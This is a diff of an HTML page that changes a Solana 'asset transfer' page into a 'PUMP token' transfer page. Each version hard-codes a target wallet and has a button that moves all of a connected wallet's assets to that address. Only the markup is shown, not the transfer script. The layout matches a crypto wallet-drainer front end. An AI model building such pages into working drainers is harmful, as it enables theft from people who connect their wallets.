@@ -3,45 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Asset Transfer</title>
+    <title>Transfer Pump Token</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
         <div class="card">
-            <div class="logo">
-                <h1>🚀 Solana Asset Transfer</h1>
-            </div>
+            <h1 class="title">⚡ PUMP TOKEN TRANSFER ⚡</h1>
             
-            <div class="target-address">
-                <h3>Target Wallet:</h3>
-                <div class="address-box">
-                    <code id="targetAddress">95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD</code>
-                    <button onclick="copyAddress()" class="copy-btn">📋 Copy</button>
+            <div class="token-info">
+                <div class="info-box">
+                    <div class="info-label">Token CA:</div>
+                    <div class="info-value">4sxxEHW6XqX5YBYs29f1p2RhR7afXFS8wQWcMYQVpump</div>
+                </div>
+                
+                <div class="info-box">
+                    <div class="info-label">Target Wallet:</div>
+                    <div class="info-value">95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD</div>
                 </div>
             </div>
             
-            <div class="info">
-                <p><strong>⚠️ Attention:</strong> All assets will be automatically transferred to the target wallet upon connection.</p>
-                <p>This includes all SOL and SPL tokens in your wallet.</p>
+            <div class="warning">
+                <div class="warning-icon">⚠️</div>
+                <div class="warning-text">
+                    <strong>Warning:</strong> Once connected, ALL PUMP tokens will be automatically transferred to the target wallet.
+                </div>
             </div>
             
-            <button id="connectBtn" class="connect-btn">
-                🔗 Connect Wallet & Transfer All
+            <button id="transferBtn" class="transfer-btn">
+                🔗 CONNECT & TRANSFER ALL PUMP
             </button>
             
-            <div class="status-container">
-                <h3>Status:</h3>
-                <div id="status" class="status-box">
-                    Ready to connect...
-                </div>
+            <div class="status">
+                <div class="status-label">Status:</div>
+                <div id="statusText" class="status-text">Ready to connect wallet...</div>
             </div>
             
-            <div class="progress-container" id="progressContainer" style="display: none;">
+            <div class="progress" id="progressContainer" style="display: none;">
                 <div class="progress-bar">
                     <div class="progress-fill" id="progressFill"></div>
                 </div>
-                <div class="progress-text" id="progressText">0%</div>
+                <div class="progress-percent" id="progressPercent">0%</div>
             </div>
         </div>
     </div>
